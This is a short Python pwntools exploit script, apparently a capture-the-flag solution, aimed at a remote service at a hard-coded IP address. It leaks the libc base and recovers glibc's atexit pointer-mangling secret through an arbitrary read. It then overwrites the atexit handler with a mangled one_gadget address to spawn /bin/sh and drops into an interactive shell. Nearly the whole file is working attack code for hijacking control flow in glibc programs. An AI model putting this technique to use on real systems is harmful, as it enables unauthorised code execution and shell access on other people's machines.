#!/usr/bin/python2

from pwn import *

context(os='linux', arch='x86_64')

p, DL_FINI_OFF = (remote('159.203.116.12', 7777), 0x3daab0)

def do_read(addr):
	p.recvuntil('read address:\n')
	p.sendline(str(addr))
	p.recvuntil('content: ')
	return int(p.recvline())

def do_write(addr, value):
	p.recvuntil('write address:\n')
	p.sendline(str(addr))
	p.recvuntil('new value:\n')
	p.sendline(str(value))

PRINTF_OFF = 0x55800

p.recvuntil('printf(): ')
libc_base = int(p.recvline()) - PRINTF_OFF
print('[+] Leaked libc base: 0x{:12x}'.format(libc_base))

ATEXIT_ENTRY = libc_base + 0x3c5c58
DL_FINI = libc_base + DL_FINI_OFF

ror17 = lambda x : ((x << 47) & (2**64 - 1)) | (x >> 17)

entry = do_read(ATEXIT_ENTRY)
atexit_secret = ror17(entry) ^ DL_FINI
print('[+] Leaked atexit secret: 0x{:12x}'.format(atexit_secret))

rol17 = lambda x : ((x << 17) & (2**64 - 1)) | (x >> 47)
atexit_mangle = lambda addr : rol17(addr ^ atexit_secret)

# execve("/bin/sh", rsp+0x30, environ)
# works by luck
ONEGADGET = libc_base + 0x4526a

do_write(ATEXIT_ENTRY, atexit_mangle(ONEGADGET))

p.interactive()
